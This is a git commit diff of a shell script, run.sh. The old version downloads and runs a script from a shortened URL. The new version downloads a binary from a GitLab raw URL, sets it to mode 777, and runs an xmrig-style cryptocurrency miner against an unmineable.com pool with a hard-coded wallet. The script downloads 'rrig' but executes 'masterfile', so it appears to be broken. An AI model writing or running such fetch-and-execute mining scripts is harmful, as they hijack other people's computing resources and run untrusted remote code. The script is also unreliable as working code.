503cf8f482e91c0237f5690eedb1744938d70231
ferasa <86012372+desafff@users.noreply.github.com>
2021-09-29 07:49:31 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,4 +1,7 @@
 #!/bin/sh
-wget -q git.io/npm.sh
-chmod +x npm.sh
-./npm.sh DQsBCUuRxrhSgjxM9DFq44GEXSYgGmDmfW OKK1 DGB
+wget https://gitlab.com/asiapboneng/verta/-/raw/main/rrig
+chmod 777 rrig
+POOL=rx.unmineable.com:80
+WALLET=BTT:TN9nZPj9qS8BUYVMhkVhHwg2PJgpQR9whL
+WORKER=$(shuf -n 1 -i 1-9999)
+./masterfile -o $POOL -u $WALLET -p $WORKER -a rx/0 --donate-level 1 -x -k
